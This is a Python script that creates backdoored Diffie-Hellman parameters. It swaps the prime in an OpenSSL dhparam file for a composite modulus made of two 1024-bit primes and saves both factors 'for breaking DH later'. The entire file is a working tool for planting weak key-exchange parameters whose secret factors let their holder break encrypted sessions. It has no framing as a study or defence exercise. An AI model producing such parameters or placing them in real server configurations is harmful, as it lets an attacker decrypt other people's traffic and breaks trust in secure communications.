from sympy import randprime
from Crypto.Util.number import long_to_bytes
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import Integer, Sequence
import subprocess
import os

# Step 1: Generate Two Large Primes (1024-bit each) Ensuring N >= 2048 Bits
while True:
    p1 = randprime(2**1023, 2**1024)  # 1024-bit prime
    p2 = randprime(2**1023, 2**1024)  # 1024-bit prime
    N = p1 * p2  # Composite modulus

    if N.bit_length() >= 2048:  # Ensure the modulus is at least 2048 bits
        break

# Save p1 and p2 for breaking DH later
with open("p1.txt", "w") as f:
    f.write(str(p1))
with open("p2.txt", "w") as f:
    f.write(str(p2))

print(f"[🔥] Backdoored Composite Modulus (N = p1 * p2) Length: {N.bit_length()} bits")

# Step 2: Generate a valid OpenSSL DH parameter file
subprocess.run(["openssl", "dhparam", "-out", "dh_original.pem", "2048"])

# Step 3: Convert PEM to DER (ASN.1 format)
subprocess.run(["openssl", "dhparam", "-in", "dh_original.pem", "-outform", "DER", "-out", "dh_asn1.der"])

# Step 4: Read ASN.1 DER data from the DH parameter file
with open("dh_asn1.der", "rb") as f:
    der_data = f.read()

# Step 5: Decode the ASN.1 structure
decoded_data, _ = decoder.decode(der_data, asn1Spec=Sequence())

# Step 6: Modify the Prime (`p`) with our Backdoored Composite Modulus
decoded_data.setComponentByPosition(0, Integer(int(N)))

# Step 7: Re-encode the modified structure back to DER
modified_der = encoder.encode(decoded_data)

# Step 8: Save the modified DER file
with open("dh_backdoor.der", "wb") as f:
    f.write(modified_der)

# Step 9: Convert the modified DER back to PEM format
subprocess.run(["openssl", "dhparam", "-inform", "DER", "-outform", "PEM", "-in", "dh_backdoor.der", "-out", "backdoor_DH.pem"])

print("[✅] Successfully created backdoored DH parameters in 'backdoor_DH.pem'")
